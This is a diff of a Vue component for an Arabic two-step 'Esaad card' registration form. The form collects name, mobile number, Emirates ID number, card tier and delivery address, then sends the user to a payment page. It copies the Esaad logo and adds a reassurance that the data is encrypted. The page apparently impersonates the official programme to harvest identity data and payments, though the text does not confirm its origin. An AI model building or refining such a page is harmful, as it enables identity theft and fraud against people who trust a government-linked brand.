@@ -5,14 +5,17 @@ import { useRouter } from 'vue-router';
 import { createCardRequest } from '../api';
 
 const router = useRouter();
+const currentStep = ref<1 | 2>(1);
 
 const formData = ref({
   name: '',
   mobile: '',
   idNumber: '',
-  cardType: '',
-  address: '',
-  date: '29/05/2026'
+  cardType: 'البلاتينية',
+  emirate: 'الشارقة',
+  area: '',
+  street: '',
+  date: '20/11/2026'
 });
 
 const isSubmitting = ref(false);
@@ -22,19 +25,34 @@ const errors = ref({
   mobile: '',
   idNumber: '',
   cardType: '',
-  address: ''
+  emirate: '',
+  area: '',
+  street: ''
 });
 
-const validateForm = () => {
+const emirates = [
+  'أبوظبي',
+  'دبي',
+  'الشارقة',
+  'عجمان',
+  'أم القيوين',
+  'رأس الخيمة',
+  'الفجيرة'
+];
+
+const validateStep1 = () => {
   let isValid = true;
-  errors.value = { name: '', mobile: '', idNumber: '', cardType: '', address: '' };
+  errors.value.name = '';
+  errors.value.mobile = '';
+  errors.value.idNumber = '';
+  errors.value.cardType = '';
 
   if (!formData.value.name.trim()) {
     errors.value.name = 'الاسم مطلوب';
     isValid = false;
   }
-  
-  if (!formData.value.mobile.trim() || !/^[0-9\+\-\s]{9,15}$/.test(formData.value.mobile)) {
+
+  if (!formData.value.mobile.trim() || !/^[0-9+\-\s]{7,15}$/.test(formData.value.mobile)) {
     errors.value.mobile = 'رقم الهاتف غير صالح';
     isValid = false;
   }
@@ -49,22 +67,61 @@ const validateForm = () => {
     isValid = false;
   }
 
-  if (!formData.value.address.trim()) {
-    errors.value.address = 'عنوان التوصيل مطلوب';
+  return isValid;
+};
+
+const validateStep2 = () => {
+  let isValid = true;
+  errors.value.emirate = '';
+  errors.value.area = '';
+  errors.value.street = '';
+
+  if (!formData.value.emirate) {
+    errors.value.emirate = 'يرجى اختيار الإمارة';
+    isValid = false;
+  }
+
+  if (!formData.value.area.trim()) {
+    errors.value.area = 'المنطقة مطلوبة';
+    isValid = false;
+  }
+
+  if (!formData.value.street.trim()) {
+    errors.value.street = 'العنوان التفصيلي مطلوب';
     isValid = false;
   }
 
   return isValid;
 };
 
+const goToStep2 = () => {
+  if (validateStep1()) {
+    currentStep.value = 2;
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }
+};
+
 const submitForm = async () => {
   if (isSubmitting.value) return;
-  if (!validateForm()) return;
-  
+  if (!validateStep2()) return;
+
   isSubmitting.value = true;
   try {
+    const fullAddress = [
+      formData.value.emirate,
+      formData.value.area.trim(),
+      formData.value.street.trim()
+    ]
+      .filter(Boolean)
+      .join(', ');
+
     await createCardRequest({
-      ...formData.value
+      name: formData.value.name.trim(),
+      mobile: formData.value.mobile.trim(),
+      idNumber: formData.value.idNumber.trim(),
+      cardType: formData.value.cardType,
+      address: fullAddress,
+      date: formData.value.date
     });
     router.push('/payment');
   } catch (error) {
@@ -74,201 +131,283 @@ const submitForm = async () => {
   }
 };
 
-const goBack = () => {
+const goHome = () => {
   router.push('/');
 };
 </script>
 
 <template>
-  <div dir="rtl" class="max-w-xl mx-auto bg-white min-h-screen flex flex-col font-sans text-gray-900 relative overflow-x-hidden">
-    
-    <!-- Esaad Top Dark Header + 3D Stage Card Banner -->
-    <div class="relative w-full bg-[#040c06] overflow-hidden pb-6">
-      <div class="absolute inset-0 bg-[radial-gradient(circle_at_50%_30%,_rgba(32,120,56,0.38)_0%,_rgba(6,24,11,0.9)_65%,_#020603_100%)] pointer-events-none"></div>
+  <div dir="rtl" class="max-w-xl mx-auto bg-[#eef5f0] min-h-screen flex flex-col font-sans text-gray-900 relative overflow-hidden">
+    <!-- Top Green/Dark Esaad Header -->
+    <header class="w-full bg-[#040c06] px-4 py-3 flex items-center justify-between border-b border-[#009a44]/30 relative z-20">
+      <button
+        @click="goHome"
+        aria-label="العودة"
+        class="w-8 h-8 rounded-full bg-white/10 hover:bg-white/20 flex items-center justify-center text-white transition-colors cursor-pointer"
+      >
+        <ArrowRight class="w-4 h-4" />
+      </button>
 
-      <!-- Top Bar -->
-      <header class="relative z-20 flex items-center justify-between px-4 pt-3 pb-2.5 border-b border-white/10">
+      <!-- Esaad Logo -->
+      <div @click="goHome" class="cursor-pointer flex flex-col items-center select-none">
+        <div class="text-[#39b54a] font-black text-base leading-none tracking-tight">إسعاد</div>
+        <div class="text-[#39b54a] font-extrabold text-sm leading-none -mt-0.5 tracking-tight">esaad</div>
+        <svg class="w-10 h-3 -mt-0.5" viewBox="0 0 60 18" fill="none">
+          <circle cx="14" cy="4" r="2" fill="#39b54a" />
+          <circle cx="46" cy="4" r="2" fill="#39b54a" />
+          <path d="M 6 6 Q 30 18 54 6" stroke="#39b54a" stroke-width="3.2" stroke-linecap="round" fill="none" />
+        </svg>
+      </div>
+
+      <div class="w-8"></div>
+    </header>
+
+    <div class="flex-1 flex flex-col items-center pt-6 px-4 pb-8">
+      <!-- Top Title: كن عضواً -->
+      <h1 class="text-[26px] font-extrabold text-[#008a40] text-center mb-5 tracking-tight">
+        كن عضواً
+      </h1>
+
+      <!-- 3-Step Indicator (Green Esaad Style) -->
+      <div class="w-full max-w-[360px] mx-auto flex items-start justify-between mb-6 px-2">
+        <!-- Step 1 -->
         <button
-          @click="goBack"
-          aria-label="العودة"
-          class="w-8 h-8 rounded-full bg-white/10 hover:bg-white/20 flex items-center justify-center text-white transition-colors cursor-pointer"
+          type="button"
+          @click="currentStep = 1"
+          class="flex flex-col items-center cursor-pointer"
         >
-          <ArrowRight class="w-4 h-4" />
+          <div
+            class="w-10 h-10 rounded-full font-bold text-base flex items-center justify-center shadow-xs tabular-nums transition-colors"
+            :class="currentStep === 1 ? 'bg-[#008a40] text-white shadow-md ring-4 ring-[#009a44]/20' : 'bg-[#009a44] text-white'"
+          >
+            1
+          </div>
+          <span
+            class="text-[11.5px] mt-1.5 whitespace-nowrap transition-colors"
+            :class="currentStep === 1 ? 'font-extrabold text-[#008a40]' : 'font-bold text-gray-700'"
+          >
+            معلومات شخصية
+          </span>
         </button>
 
-        <!-- Esaad Logo -->
-        <div @click="goBack" class="cursor-pointer flex flex-col items-center select-none">
-          <div class="text-[#39b54a] font-black text-base leading-none tracking-tight">إسعاد</div>
-          <div class="text-[#39b54a] font-extrabold text-sm leading-none -mt-0.5 tracking-tight">esaad</div>
-          <svg class="w-10 h-3 -mt-0.5" viewBox="0 0 60 18" fill="none">
-            <circle cx="14" cy="4" r="2" fill="#39b54a" />
-            <circle cx="46" cy="4" r="2" fill="#39b54a" />
-            <path d="M 6 6 Q 30 18 54 6" stroke="#39b54a" stroke-width="3.2" stroke-linecap="round" fill="none" />
-          </svg>
+        <!-- Connector Line 1-2 -->
+        <div class="flex-1 flex items-center justify-center pt-5 px-2">
+          <div
+            class="w-full max-w-[44px] h-[2.5px] rounded-full transition-colors"
+            :class="currentStep >= 2 ? 'bg-[#009a44]' : 'bg-gray-300'"
+          ></div>
         </div>
 
-        <div class="w-8"></div>
-      </header>
-
-      <!-- Hero Card Visual Showcase -->
-      <div class="relative z-10 pt-5 px-5 flex flex-col items-center text-center">
-        <div
-          class="w-[200px] h-[124px] rounded-xl shadow-2xl transform -rotate-6 overflow-hidden border border-[#39b54a]/40 relative mb-4"
-          style="background: linear-gradient(135deg, #009944 0%, #007b36 55%, #005e28 100%);"
-          dir="ltr"
+        <!-- Step 2 -->
+        <button
+          type="button"
+          @click="goToStep2"
+          class="flex flex-col items-center cursor-pointer"
         >
-          <svg class="absolute inset-0 w-full h-full opacity-20" viewBox="0 0 200 130" fill="none">
-            <path d="M-20 110 Q 60 50 220 90" stroke="#7ce895" stroke-width="1" />
-            <path d="M-20 120 Q 70 60 220 100" stroke="#7ce895" stroke-width="1" />
-          </svg>
-          <!-- Gold Chip -->
-          <div class="absolute right-4 top-9 w-7 h-5 rounded-xs bg-gradient-to-br from-[#f6d365] to-[#cda349] border border-yellow-600/50"></div>
-          <!-- Center Logo -->
-          <div class="absolute inset-0 flex flex-col items-center justify-center">
-            <span class="text-[#a3e6b5] font-black text-lg leading-none">إسعاد</span>
-            <span class="text-[#a3e6b5] font-extrabold text-base leading-none -mt-0.5">esaad</span>
-            <svg class="w-10 h-3 -mt-0.5" viewBox="0 0 60 18" fill="none">
-              <circle cx="14" cy="4" r="2" fill="#a3e6b5" />
-              <circle cx="46" cy="4" r="2" fill="#a3e6b5" />
-              <path d="M 6 6 Q 30 18 54 6" stroke="#a3e6b5" stroke-width="3" stroke-linecap="round" />
-            </svg>
+          <div
+            class="w-10 h-10 rounded-full font-bold text-base flex items-center justify-center shadow-xs tabular-nums transition-colors"
+            :class="currentStep === 2 ? 'bg-[#008a40] text-white shadow-md ring-4 ring-[#009a44]/20' : 'bg-gray-200 text-gray-500'"
+          >
+            2
           </div>
-          <div class="absolute bottom-2 left-3 text-left leading-tight">
-            <div class="text-[7.5px] font-bold tracking-wider text-[#b6f0c6] uppercase">{{ formData.name || 'ESAAD CARD HOLDER NAME' }}</div>
-            <div class="text-[6.5px] font-mono text-[#9be2b0] tracking-wider">{{ formData.idNumber || '784-1234-1234567-1' }}</div>
-          </div>
+          <span
+            class="text-[11.5px] mt-1.5 whitespace-nowrap transition-colors"
+            :class="currentStep === 2 ? 'font-extrabold text-[#008a40]' : 'font-bold text-gray-600'"
+          >
+            معلومات العنوان
+          </span>
+        </button>
+
+        <!-- Connector Line 2-3 -->
+        <div class="flex-1 flex items-center justify-center pt-5 px-2">
+          <div class="w-full max-w-[44px] h-[2.5px] bg-gray-300 rounded-full"></div>
         </div>
 
-        <h1 class="text-white font-extrabold text-base leading-snug">
-          التسجيل وطلب بطاقة إسعاد
-        </h1>
-        <p class="text-gray-300 text-[11px] mt-1 max-w-xs leading-relaxed">
-          أدخل البيانات المطلوبة لإكمال طلب البطاقة وتأكيد عنوان التوصيل
-        </p>
+        <!-- Step 3 -->
+        <div class="flex flex-col items-center">
+          <div class="w-10 h-10 rounded-full bg-gray-200 text-gray-500 font-bold text-base flex items-center justify-center shadow-xs tabular-nums">
+            3
+          </div>
+          <span class="text-[11.5px] font-bold text-gray-600 mt-1.5 whitespace-nowrap">
+            اشترك
+          </span>
+        </div>
       </div>
-    </div>
 
-    <!-- Form Section -->
-    <div class="px-5 py-6 flex-1 bg-[#eef5f0]">
-      <form @submit.prevent="submitForm" class="bg-white border border-gray-200/80 rounded-2xl p-5 shadow-[0_4px_20px_rgba(0,0,0,0.05)] max-w-md mx-auto">
-        
-        <div class="space-y-5 text-right">
-          
+      <!-- Main Container Card -->
+      <div class="w-full max-w-md bg-white rounded-2xl border border-gray-200/80 shadow-[0_4px_24px_rgba(0,0,0,0.05)] p-5">
+        <!-- STEP 1: معلومات شخصية -->
+        <form v-if="currentStep === 1" @submit.prevent="goToStep2" novalidate class="space-y-4 text-right">
+          <h2 class="text-[18px] font-extrabold text-[#008a40] text-right mb-3">
+            معلومات شخصية
+          </h2>
+
           <!-- Name -->
-          <div class="relative">
-            <label class="block text-[11px] font-bold text-[#008a40] mb-1">الاسم الكامل</label>
-            <input 
+          <div>
+            <label class="block text-xs font-bold text-gray-700 mb-1.5">الاسم الكامل</label>
+            <input
               v-model="formData.name"
-              type="text" 
+              type="text"
               dir="rtl"
-              placeholder="الاسم كما يظهر في الهوية" 
-              class="w-full border-b border-gray-300 rounded-none px-2 py-2 text-right focus:outline-none focus:border-[#009a44] placeholder-gray-400 text-gray-900 bg-transparent transition-colors font-medium text-sm"
+              placeholder="الاسم كما يظهر في الهوية"
+              class="w-full rounded-xl border border-gray-200 px-3.5 py-2.5 text-right focus:outline-none focus:border-[#009a44] placeholder-gray-400 text-gray-900 bg-white transition-colors font-medium text-sm"
             />
             <p v-if="errors.name" class="text-red-600 text-[11px] mt-1">{{ errors.name }}</p>
           </div>
 
-          <!-- Mobile number -->
-          <div class="relative">
-            <label class="block text-[11px] font-bold text-[#008a40] mb-1">رقم الهاتف المتحرك</label>
-            <input 
+          <!-- Mobile -->
+          <div>
+            <label class="block text-xs font-bold text-gray-700 mb-1.5">رقم الهاتف</label>
+            <input
               v-model="formData.mobile"
-              type="tel" 
-              dir="rtl"
-              placeholder="05X XXX XXXX" 
-              class="w-full border-b border-gray-300 rounded-none px-2 py-2 text-right focus:outline-none focus:border-[#009a44] placeholder-gray-400 text-gray-900 bg-transparent transition-colors font-medium text-sm"
+              type="tel"
+              inputmode="numeric"
+              dir="ltr"
+              placeholder="05XXXXXXXX"
+              class="w-full rounded-xl border border-gray-200 px-3.5 py-2.5 text-right focus:outline-none focus:border-[#009a44] placeholder-gray-400 text-gray-900 bg-white transition-colors font-medium text-sm"
             />
             <p v-if="errors.mobile" class="text-red-600 text-[11px] mt-1">{{ errors.mobile }}</p>
           </div>
 
           <!-- ID Number -->
-          <div class="relative">
-            <label class="block text-[11px] font-bold text-[#008a40] mb-1">رقم الهوية الإماراتية</label>
-            <input 
+          <div>
+            <label class="block text-xs font-bold text-gray-700 mb-1.5">رقم الهوية الإماراتية</label>
+            <input
               v-model="formData.idNumber"
-              type="text" 
-              dir="rtl"
-              placeholder="784-XXXX-XXXXXXX-X" 
-              class="w-full border-b border-gray-300 rounded-none px-2 py-2 text-right focus:outline-none focus:border-[#009a44] placeholder-gray-400 text-gray-900 bg-transparent transition-colors font-medium text-sm"
+              type="tel"
+              inputmode="numeric"
+              dir="ltr"
+              placeholder="784-XXXX-XXXXXXX-X"
+              class="w-full rounded-xl border border-gray-200 px-3.5 py-2.5 text-right focus:outline-none focus:border-[#009a44] placeholder-gray-400 text-gray-900 bg-white transition-colors font-medium text-sm"
             />
             <p v-if="errors.idNumber" class="text-red-600 text-[11px] mt-1">{{ errors.idNumber }}</p>
           </div>
 
-          <!-- Card Type Dropdown -->
-          <div class="relative">
-            <label class="block text-[11px] font-bold text-[#008a40] mb-1">فئة بطاقة إسعاد</label>
+          <!-- Card Type -->
+          <div>
+            <label class="block text-xs font-bold text-gray-700 mb-1.5">نوع البطاقة</label>
             <div class="relative">
-              <select 
+              <select
                 v-model="formData.cardType"
                 dir="rtl"
-                class="w-full border-b border-gray-300 rounded-none px-2 py-2 appearance-none text-gray-900 focus:outline-none focus:border-[#009a44] bg-transparent transition-colors font-medium text-sm pl-8 cursor-pointer"
+                class="w-full rounded-xl border border-gray-200 px-3.5 py-2.5 appearance-none text-gray-900 focus:outline-none focus:border-[#009a44] bg-white transition-colors font-semibold text-sm pl-9 cursor-pointer"
               >
-                <option value="" disabled selected hidden>اختر نوع البطاقة</option>
-                <option value="silver">بطاقة إسعاد الأساسية (Classic)</option>
-                <option value="gold">بطاقة إسعاد الذهبية (Gold)</option>
-                <option value="platinum">بطاقة إسعاد البلاتينية (Platinum)</option>
+                <option value="البلاتينية">البلاتينية</option>
+                <option value="الذهبية">الذهبية</option>
+                <option value="الأساسية">الأساسية</option>
               </select>
-              <div class="absolute inset-y-0 left-2 flex items-center pointer-events-none text-[#009a44]">
+              <div class="absolute inset-y-0 left-3 flex items-center pointer-events-none text-[#009a44]">
                 <ChevronDown class="w-4 h-4" />
               </div>
             </div>
             <p v-if="errors.cardType" class="text-red-600 text-[11px] mt-1">{{ errors.cardType }}</p>
           </div>
 
-          <!-- Address -->
-          <div class="relative">
-            <label class="block text-[11px] font-bold text-[#008a40] mb-1">عنوان التوصيل</label>
-            <input 
-              v-model="formData.address"
-              type="text" 
-              dir="rtl"
-              placeholder="الإمارة، المنطقة، الشارع، رقم المبنى" 
-              class="w-full border-b border-gray-300 rounded-none px-2 py-2 text-right focus:outline-none focus:border-[#009a44] placeholder-gray-400 text-gray-900 bg-transparent transition-colors font-medium text-sm"
-            />
-            <p v-if="errors.address" class="text-red-600 text-[11px] mt-1">{{ errors.address }}</p>
+          <div class="pt-3">
+            <button
+              type="submit"
+              class="w-full bg-[#008a40] hover:bg-[#007335] text-white font-extrabold text-sm py-3.5 px-6 rounded-xl shadow-md transition-colors cursor-pointer"
+            >
+              التالي
+            </button>
+          </div>
+        </form>
+
+        <!-- STEP 2: معلومات العنوان -->
+        <form v-else @submit.prevent="submitForm" novalidate class="space-y-4 text-right">
+          <h2 class="text-[18px] font-extrabold text-[#008a40] text-right mb-3">
+            معلومات العنوان
+          </h2>
+
+          <!-- Emirate -->
+          <div>
+            <label class="block text-xs font-bold text-gray-700 mb-1.5">الإمارة</label>
+            <div class="relative">
+              <select
+                v-model="formData.emirate"
+                dir="rtl"
+                class="w-full rounded-xl border border-gray-200 px-3.5 py-2.5 appearance-none text-gray-900 focus:outline-none focus:border-[#009a44] bg-white transition-colors font-semibold text-sm pl-9 cursor-pointer"
+              >
+                <option v-for="em in emirates" :key="em" :value="em">{{ em }}</option>
+              </select>
+              <div class="absolute inset-y-0 left-3 flex items-center pointer-events-none text-[#009a44]">
+                <ChevronDown class="w-4 h-4" />
+              </div>
+            </div>
+            <p v-if="errors.emirate" class="text-red-600 text-[11px] mt-1">{{ errors.emirate }}</p>
           </div>
 
-          <!-- Date -->
-          <div class="relative">
-            <label class="block text-[11px] font-bold text-[#008a40] mb-1">تاريخ الطلب</label>
+          <!-- Area -->
+          <div>
+            <label class="block text-xs font-bold text-gray-700 mb-1.5">المنطقة / الحي</label>
+            <input
+              v-model="formData.area"
+              type="text"
+              dir="rtl"
+              placeholder="أدخل المنطقة أو الحي"
+              class="w-full rounded-xl border border-gray-200 px-3.5 py-2.5 text-right focus:outline-none focus:border-[#009a44] placeholder-gray-400 text-gray-900 bg-white transition-colors font-medium text-sm"
+            />
+            <p v-if="errors.area" class="text-red-600 text-[11px] mt-1">{{ errors.area }}</p>
+          </div>
+
+          <!-- Detailed Street / Building -->
+          <div>
+            <label class="block text-xs font-bold text-gray-700 mb-1.5">العنوان التفصيلي</label>
+            <input
+              v-model="formData.street"
+              type="text"
+              dir="rtl"
+              placeholder="الشارع، رقم المبنى أو الفيلا"
+              class="w-full rounded-xl border border-gray-200 px-3.5 py-2.5 text-right focus:outline-none focus:border-[#009a44] placeholder-gray-400 text-gray-900 bg-white transition-colors font-medium text-sm"
+            />
+            <p v-if="errors.street" class="text-red-600 text-[11px] mt-1">{{ errors.street }}</p>
+          </div>
+
+          <!-- Delivery Date -->
+          <div>
+            <label class="block text-xs font-bold text-gray-700 mb-1.5">موعد الاستلام</label>
             <div class="relative">
-              <input 
+              <input
                 v-model="formData.date"
-                type="text" 
-                dir="rtl"
-                readonly
-                class="w-full border-b border-gray-300 rounded-none px-2 py-2 text-right focus:outline-none text-gray-700 bg-transparent font-medium text-sm pl-10 opacity-80 cursor-default"
+                type="text"
+                dir="ltr"
+                class="w-full rounded-xl border border-gray-200 px-3.5 py-2.5 text-right focus:outline-none focus:border-[#009a44] text-gray-900 bg-white font-medium text-sm pl-10"
               />
-              <div class="absolute inset-y-0 left-2 flex items-center pointer-events-none text-[#009a44]">
+              <div class="absolute inset-y-0 left-3 flex items-center pointer-events-none text-[#009a44]">
                 <Calendar class="w-4 h-4" />
               </div>
             </div>
           </div>
 
-          <!-- Submit Button -->
-          <div class="pt-3">
-            <button 
-              type="submit" 
+          <div class="pt-3 flex gap-3">
+            <button
+              type="button"
+              @click="currentStep = 1"
+              class="w-1/3 bg-gray-100 hover:bg-gray-200 text-gray-700 font-bold text-sm py-3.5 px-4 rounded-xl transition-colors cursor-pointer"
+            >
+              السابق
+            </button>
+            <button
+              type="submit"
               :disabled="isSubmitting"
-              class="flex items-center justify-center gap-2 bg-[#008a40] hover:bg-[#007335] transition-colors text-white font-bold text-sm py-3 rounded-xl shadow-md w-full cursor-pointer disabled:opacity-70 disabled:cursor-not-allowed"
+              class="w-2/3 flex items-center justify-center gap-2 bg-[#008a40] hover:bg-[#007335] text-white font-extrabold text-sm py-3.5 px-6 rounded-xl shadow-md transition-colors cursor-pointer disabled:opacity-70"
             >
               <span v-if="isSubmitting" class="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></span>
-              <span v-else>المتابعة</span>
+              <span v-else>المتابعة إلى الفاتورة</span>
             </button>
           </div>
-          
+        </form>
+
+        <!-- Trust Note -->
+        <div class="mt-4 flex items-center justify-center gap-1.5 text-[11px] text-gray-500">
+          <ShieldCheck class="w-3.5 h-3.5 text-[#008a40]" />
+          <span>بياناتك محمية ومشفرة وفق معايير بطاقة إسعاد</span>
         </div>
-
-      </form>
-
-      <!-- Trust note -->
-      <div class="mt-5 flex items-center justify-center gap-2 text-[11px] text-gray-600">
-        <ShieldCheck class="w-3.5 h-3.5 text-[#008a40]" />
-        <span>جميع البيانات مشفرة ومحمية وفق معايير برنامج إسعاد</span>
       </div>
     </div>
 
     <!-- Esaad Footer -->
-    <footer class="bg-[#e4f2ea] px-5 py-4 text-right border-t border-gray-200/60">
+    <footer class="bg-[#e4f2ea] px-5 py-4 text-right border-t border-gray-200/60 mt-auto">
       <div class="flex items-center justify-between">
         <div class="flex flex-col items-center">
           <span class="text-[#008a40] font-black text-xs leading-none">إسعاد</span>
@@ -277,6 +416,5 @@ const goBack = () => {
         <span class="text-[11px] text-gray-600 font-medium">© 2026 esaad, كل الحقوق محفوظة.</span>
       </div>
     </footer>
-
   </div>
 </template>
